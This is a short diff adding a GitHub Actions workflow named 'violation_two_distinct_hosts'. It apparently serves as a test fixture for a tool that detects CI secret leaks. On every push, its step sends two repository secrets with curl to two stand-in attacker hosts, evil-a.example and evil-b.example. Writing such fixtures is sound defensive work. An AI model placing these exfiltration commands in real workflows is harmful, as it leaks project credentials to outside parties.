@@ -1,0 +1,9 @@
+name: violation_two_distinct_hosts
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -d "a=${{ secrets.TOKEN_A }}" https://evil-a.example/a
+          curl -d "b=${{ secrets.TOKEN_B }}" https://evil-b.example/b
